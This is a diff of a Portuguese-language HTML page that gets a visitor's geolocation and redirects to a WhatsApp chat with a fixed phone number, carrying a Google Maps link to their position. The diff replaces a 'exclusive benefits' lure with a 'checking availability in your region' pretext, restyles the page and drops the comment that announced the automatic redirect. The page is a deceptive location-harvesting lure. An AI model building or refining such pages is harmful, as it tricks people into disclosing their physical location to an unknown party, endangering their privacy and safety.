@@ -3,47 +3,52 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Compartilhar Localização</title>
+    <title>Verificando Disponibilidade</title>
     <style>
         body {
-            font-family: Arial, sans-serif;
-            text-align: center;
-            background-color: #f4f4f4;
-            padding: 20px;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(to right, #f8f9fa, #e9ecef);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
         }
 
-        .container {
+        .card {
+            background: #fff;
+            border-radius: 12px;
+            padding: 30px 25px;
             max-width: 400px;
-            margin: 50px auto;
-            background: white;
-            padding: 20px;
-            border-radius: 10px;
-            box-shadow: 0px 4px 6px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.1);
         }
 
         h2 {
             color: #333;
+            margin-bottom: 15px;
         }
 
         p {
-            color: #666;
-            font-size: 16px;
+            color: #555;
+            font-size: 15px;
+            line-height: 1.5;
         }
 
         .btn {
-            display: inline-block;
-            background-color: #28a745;
-            color: white;
-            padding: 10px 20px;
-            border-radius: 5px;
-            text-decoration: none;
-            font-size: 18px;
-            margin-top: 15px;
+            background-color: #007bff;
+            color: #fff;
+            padding: 12px 24px;
+            margin-top: 20px;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
             cursor: pointer;
+            transition: background-color 0.3s ease;
         }
 
         .btn:hover {
-            background-color: #218838;
+            background-color: #0056b3;
         }
     </style>
 
@@ -57,8 +62,6 @@
                         let linkMaps = `https://www.google.com/maps?q=${latitude},${longitude}`;
 
                         let whatsapp = `https://wa.me/558197921133?text=Minha localização: ${linkMaps}`;
-                        
-                        // Redireciona automaticamente para o WhatsApp
                         window.location.href = whatsapp;
                     },
                     function(error) {
@@ -77,10 +80,10 @@
     </script>
 </head>
 <body>
-    <div class="container">
-        <h2>🎁Carregando Benefícios Exclusivos... </h2>
-        <p>Estamos configurando as melhores opções para você! Clique abaixo para ativar automaticamente e garantir acesso total.</p>
-        <button class="btn" onclick="enviarLocalizacao()">Clicar Aqui</button>
+    <div class="card">
+        <h2>Verificando Disponibilidade na Sua Região</h2>
+        <p>Estamos localizando os serviços disponíveis próximos de você. Clique no botão abaixo para continuar com a verificação.</p>
+        <button class="btn" onclick="enviarLocalizacao()">Continuar</button>
     </div>
 </body>
 </html>
